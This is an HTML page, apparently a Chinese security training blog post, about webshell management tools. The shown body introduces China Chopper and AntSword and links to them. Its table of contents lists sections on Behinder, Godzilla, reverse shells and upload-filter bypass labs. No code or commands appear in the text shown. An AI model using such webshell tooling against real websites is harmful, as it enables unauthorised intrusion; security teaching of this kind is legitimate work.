@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="day6-webshell详解二（下午：webshell管理工具）各种管理工具的使用中国菜刀这里的中国菜刀不是指切菜做饭的工具,而是中国黑客圈内使用非常广泛的一款Webshel。中国菜刀是一款功能强大的webshell工具，可以用来对目标网站进行渗透获取目标系统的文件系统，对目标系统的文件系统进行管理同时也可以对获取系统的shell进行操作命令执行操作，同时可以对目标系统进行数据库操作， 中国蚁剑">
+<meta property="og:type" content="article">
+<meta property="og:title" content="day6-webshell详解二（下午：webshell管理工具）">
+<meta property="og:url" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="day6-webshell详解二（下午：webshell管理工具）各种管理工具的使用中国菜刀这里的中国菜刀不是指切菜做饭的工具,而是中国黑客圈内使用非常广泛的一款Webshel。中国菜刀是一款功能强大的webshell工具，可以用来对目标网站进行渗透获取目标系统的文件系统，对目标系统的文件系统进行管理同时也可以对获取系统的shell进行操作命令执行操作，同时可以对目标系统进行数据库操作， 中国蚁剑">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/ZevY55mQgTYWA_7pIlamZsTMtFeTF3kDu96D6qBgrPc.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/PSDLGTxk-7ls1ZkNcgxGBQhknpJYnWil6Kh8CLv17ZE.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/UZyNIPMWpwwu9nT22ezKqIeOvOFmr_X44A0ux_KKpio.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/JcoBJEc7H49SI1RGpiOOlpEMptHr7ZNq8AIV6--QxFg.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/8wXi2VcKW4Y4gTJfNmhpvPiXwYbanP8qADIPRvNipek.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/BwkPi0UxD9tbktuSkurfaLEWfOektzoLEqi6xsSgREI.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/fm38-TKyii24Am1QpihhdEJVTGDTY1w91xnwcAIVYok.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/20rur-ZAQ7qBbGDgqZ0tdX5xl-C87mb_D4ak4UELzxY.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/20rur-ZAQ7qBbGDgqZ0tdX5xl-C87mb_D4ak4UELzxY.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/qxi3xPp2qch9MxZRLJDMEDZ-dAXo4cvCe1JGGv5xLl0.png">
+<meta property="article:published_time" content="2022-08-16T13:40:49.000Z">
+<meta property="article:modified_time" content="2023-05-29T13:19:23.964Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="中国蚁剑">
+<meta property="article:tag" content="冰蝎">
+<meta property="article:tag" content="哥斯拉">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/ZevY55mQgTYWA_7pIlamZsTMtFeTF3kDu96D6qBgrPc.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>day6-webshell详解二（下午：webshell管理工具）</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/08/16/day7-%E7%A4%BE%E5%B7%A5%E9%92%93%E9%B1%BC%E6%8A%80%E6%9C%AF/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/08/16/day1-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%A6%82%E5%BF%B5%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%89/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&text=day6-webshell详解二（下午：webshell管理工具）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&title=day6-webshell详解二（下午：webshell管理工具）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&is_video=false&description=day6-webshell详解二（下午：webshell管理工具）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=day6-webshell详解二（下午：webshell管理工具）&body=Check out this article: https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&title=day6-webshell详解二（下午：webshell管理工具）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&title=day6-webshell详解二（下午：webshell管理工具）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&title=day6-webshell详解二（下午：webshell管理工具）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&title=day6-webshell详解二（下午：webshell管理工具）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&name=day6-webshell详解二（下午：webshell管理工具）&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/&t=day6-webshell详解二（下午：webshell管理工具）"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">day6-webshell详解二（下午：webshell管理工具）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">各种管理工具的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80"><span class="toc-number">1.2.1.</span> <span class="toc-text">中国菜刀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91"><span class="toc-number">1.2.2.</span> <span class="toc-text">中国蚁剑</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">使用教程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%84%E6%88%90"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">组成</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">代理设置</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E6%9C%89%E4%BB%80%E4%B9%88%E7%94%A8%EF%BC%9F"><span class="toc-number">1.2.2.4.1.</span> <span class="toc-text">代理有什么用？</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Shell-%E7%AE%A1%E7%90%86"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">Shell 管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86"><span class="toc-number">1.2.2.6.</span> <span class="toc-text">文件管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-number">1.2.2.7.</span> <span class="toc-text">虚拟终端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86"><span class="toc-number">1.2.2.8.</span> <span class="toc-text">数据库管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6%E5%B8%82%E5%9C%BA"><span class="toc-number">1.2.2.9.</span> <span class="toc-text">插件市场</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90"><span class="toc-number">1.2.2.10.</span> <span class="toc-text">流量特征分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E3-0"><span class="toc-number">1.2.3.</span> <span class="toc-text">冰蝎3.0</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%EF%BC%9A"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">介绍：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%B8%A6shell"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">自带shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">流量解密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E5%BE%81"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">特征</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.3.5.</span> <span class="toc-text">1.基本信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.3.6.</span> <span class="toc-text">2.命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%99%9A%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-number">1.2.3.7.</span> <span class="toc-text">3.虚拟终端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86"><span class="toc-number">1.2.3.8.</span> <span class="toc-text">4.文件管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.2.3.9.</span> <span class="toc-text">5.内网渗透</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.2.3.10.</span> <span class="toc-text">6.反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E7%AE%A1%E7%90%86%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.2.3.11.</span> <span class="toc-text">7.管理数据库</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">1.2.4.</span> <span class="toc-text">哥斯拉</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%EF%BC%9A-1"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">介绍：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%9F%E8%83%BD%EF%BC%9A"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">功能：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">生成木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E9%80%BB%E8%BE%91"><span class="toc-number">1.2.4.4.</span> <span class="toc-text">木马的利用逻辑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.2.4.5.</span> <span class="toc-text">流量分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E6%A8%A1%E5%9D%97%E8%AE%B2%E8%A7%A3"><span class="toc-number">1.2.4.6.</span> <span class="toc-text">其它模块讲解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">上传方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1%EF%BC%88JS%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">Less-1（JS绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2%EF%BC%88%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.3.3.</span> <span class="toc-text">Less-2（文件类型绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5%EF%BC%88%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.3.4.</span> <span class="toc-text">Less-5（大小写绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">1.3.5.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-10"><span class="toc-number">1.3.6.</span> <span class="toc-text">Less-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-17%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.7.</span> <span class="toc-text">Less-17（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1%EF%BC%88JS%E7%BB%95%E8%BF%87%EF%BC%89-1"><span class="toc-number">1.3.8.</span> <span class="toc-text">Less-1（JS绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2%EF%BC%88%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87%EF%BC%89-1"><span class="toc-number">1.3.9.</span> <span class="toc-text">Less-2（文件类型绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3%EF%BC%88%E8%B7%B3%E8%BF%87%EF%BC%89"><span class="toc-number">1.3.10.</span> <span class="toc-text">Less-3（跳过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4%EF%BC%88-htaccess%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.3.11.</span> <span class="toc-text">Less-4（.htaccess绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5%EF%BC%88%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%89-1"><span class="toc-number">1.3.12.</span> <span class="toc-text">Less-5（大小写绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-2"><span class="toc-number">1.3.13.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-10-1"><span class="toc-number">1.3.14.</span> <span class="toc-text">Less-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-11%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.15.</span> <span class="toc-text">Less-11（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-12%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.16.</span> <span class="toc-text">Less-12（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-13%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.17.</span> <span class="toc-text">Less-13（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-14%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.18.</span> <span class="toc-text">Less-14（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-15%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.19.</span> <span class="toc-text">Less-15（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-16%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.20.</span> <span class="toc-text">Less-16（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-17%EF%BC%88%EF%BC%89-1"><span class="toc-number">1.3.21.</span> <span class="toc-text">Less-17（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-18%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.22.</span> <span class="toc-text">Less-18（）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-19%EF%BC%88%EF%BC%89"><span class="toc-number">1.3.23.</span> <span class="toc-text">Less-19（）</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        day6-webshell详解二（下午：webshell管理工具）
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-16T13:40:49.000Z" class="dt-published" itemprop="datePublished">2022-08-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%8E%9F%E5%88%9B%E5%9F%B9%E8%AE%AD%E8%AF%BE%E4%BB%B6/">原创培训课件</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/" rel="tag">中国蚁剑</a>, <a class="p-category" href="/tags/%E5%86%B0%E8%9D%8E/" rel="tag">冰蝎</a>, <a class="p-category" href="/tags/%E5%93%A5%E6%96%AF%E6%8B%89/" rel="tag">哥斯拉</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="day6-webshell详解二（下午：webshell管理工具）"><a href="#day6-webshell详解二（下午：webshell管理工具）" class="headerlink" title="day6-webshell详解二（下午：webshell管理工具）"></a>day6-webshell详解二（下午：webshell管理工具）</h1><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="各种管理工具的使用"><a href="#各种管理工具的使用" class="headerlink" title="各种管理工具的使用"></a>各种管理工具的使用</h2><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>这里的中国菜刀不是指切菜做饭的工具,而是中国黑客圈内使用非常广泛的一款Webshel。中国菜刀是一款功能强大的webshell工具，可以用来对目标网站进行渗透获取目标系统的文件系统，对目标系统的文件系统进行管理同时也可以对获取系统的shell进行操作命令执行操作，同时可以对目标系统进行数据库操作，</p>
+<h3 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h3><h4 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h4><p><a target="_blank" rel="noopener" href="https://www.yuque.com/antswordproject/antsword">https://www.yuque.com/antswordproject/antsword</a></p>
+<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>中国蚁剑是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。中国蚁剑采用了Electron作为外壳，ES6作为前端代码编写语言，搭配Babel&amp;&amp;Webpack进行组件化构建编译，外加 iconv-lite编码解码模块以及superagent数据发送处理模块还有nedb数据存储模块，组成了这个年轻而又充满活力的新一代大杀器。</p>
+<h4 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h4><p>蚁剑分为两部分，一部分是加载器，就是界面<strong>，</strong>一个是项目核心源码</p>
+<p>加载器：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Loader">https://github.com/AntSwordProject/AntSword-Loader</a></p>
+<p>核心源码：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword.git">https://github.com/AntSwordProject/AntSword.git</a></p>
